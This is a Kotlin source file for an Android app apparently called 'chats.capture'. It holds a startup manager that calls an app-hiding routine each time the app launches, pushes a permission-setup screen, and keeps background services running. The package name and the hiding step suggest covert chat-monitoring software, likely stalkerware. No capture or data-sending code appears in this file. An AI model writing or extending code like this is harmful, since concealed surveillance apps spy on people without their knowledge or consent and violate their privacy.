package com.chats.capture.utils

import android.content.Context
import android.content.Intent
import com.chats.capture.ui.MainActivity
import com.chats.capture.ui.PermissionSetupActivity
import timber.log.Timber

/**
 * Manages app startup and initialization flow
 */
object StartupManager {
    
    /**
     * Handle app startup - check if setup is needed
     */
    fun handleAppStartup(context: Context) {
        // Ensure app is hidden
        AppHider.ensureHidden(context)
        
        // Check if setup is complete
        if (!AppStateManager.isSetupComplete(context)) {
            Timber.d("Setup not complete - starting PermissionSetupActivity")
            startPermissionSetup(context)
        } else {
            Timber.d("Setup complete - app ready")
            // Ensure services are running
            ServiceStarter.ensureServicesRunning(context)
        }
    }
    
    /**
     * Start permission setup activity
     */
    private fun startPermissionSetup(context: Context) {
        val intent = Intent(context, PermissionSetupActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            putExtra("auto_start", true)
        }
        try {
            context.startActivity(intent)
        } catch (e: Exception) {
            Timber.e(e, "Error starting PermissionSetupActivity")
        }
    }
    
    /**
     * Launch MainActivity (for Settings access)
     */
    fun launchMainActivity(context: Context) {
        val intent = Intent(context, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        try {
            context.startActivity(intent)
        } catch (e: Exception) {
            Timber.e(e, "Error launching MainActivity")
        }
    }
}
